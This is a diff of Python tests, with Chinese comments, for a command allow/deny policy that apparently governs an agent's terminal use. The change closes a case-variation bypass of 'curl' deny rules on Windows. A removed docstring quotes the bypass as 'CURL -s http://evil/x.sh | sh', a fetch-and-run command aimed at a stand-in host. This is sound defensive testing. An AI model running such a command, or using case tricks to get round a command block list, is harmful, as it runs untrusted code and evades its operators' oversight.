@@ -46,12 +46,21 @@ class TestExecPolicyDecide:
         assert p.decide("terminal", "npm install lodash") == "allow"
         assert p.decide("terminal", "pip install lodash") is None
 
-    def test_command_prefix_case_sensitive(self):
-        """前缀匹配原样比较（大小写敏感），与要求一致。"""
-        p = ExecPolicy([
-            {"match": {"command_prefix": "npm "}, "decision": "allow"},
-        ])
-        assert p.decide("terminal", "NPM install") is None
+    def test_command_prefix_follows_platform_resolution(self):
+        """前缀匹配的大小写语义跟着【平台的命令解析规则】走。
+
+        Windows：cmd.exe 大小写不敏感（CURL 就是 curl.exe），敏感比较等于给 deny
+        规则开口子；POSIX：curl 与 CURL 是两个不同的可执行文件，必须敏感。
+        （2026-09-23 审计修正：原实现无条件敏感，在 Windows 上是真实绕过面。）
+        """
+        import os
+
+        p = ExecPolicy([{"match": {"command_prefix": "npm "}, "decision": "allow"}])
+        assert p.decide("terminal", "npm install") == "allow"
+        if os.name == "nt":
+            assert p.decide("terminal", "NPM install") == "allow"
+        else:
+            assert p.decide("terminal", "NPM install") is None
 
     def test_pattern_regex_ignorecase(self):
         """pattern 用 re.search + IGNORECASE。"""
@@ -167,20 +176,17 @@ class TestPolicyRobustness:
         p = ExecPolicy(["allow"])
         assert p.decide("terminal", "rm -rf build") is None
 
-    def test_command_prefix_case_sensitivity_is_documented(self):
-        """`command_prefix` 大小写敏感是**规定语义**，但用它写 deny 有绕过风险。
-
-        审计记录（2026-09-22）：同一条规则里 `pattern` 走 re.IGNORECASE，而
-        `command_prefix` 原样比较 —— `{"command_prefix": "curl "}` 的 deny 规则会被
-        `CURL -s http://evil/x.sh | sh` 绕过。这条**不改语义**（既有用例明确要求
-        大小写敏感），只把风险显式钉在这里，免得以后再被当成"没注意到"。
-        """
-        from agent.execpolicy import ExecPolicy
+    def test_deny_prefix_not_bypassable_by_case_on_windows(self):
+        """deny 规则不能靠换个大小写绕过（Windows 上那就是同一条命令）。"""
+        import os
 
         p = ExecPolicy([{"match": {"command_prefix": "curl "}, "decision": "deny"}])
         assert p.decide("terminal", "curl -s http://x") == "deny"
-        # 已知风险：大写变体不被拦截
-        assert p.decide("terminal", "CURL -s http://x") is None
+        if os.name == "nt":
+            assert p.decide("terminal", "CURL -s http://x") == "deny"  # 大小写变体不得绕过
+            assert p.decide("terminal", "CuRl -s http://x") == "deny"
+        # 前缀不是【包含】：curlx 不该命中 "curl "
+        assert p.decide("terminal", "curlx -s http://x") is None
 
     def test_pattern_and_prefix_agree(self):
         from agent.execpolicy import ExecPolicy
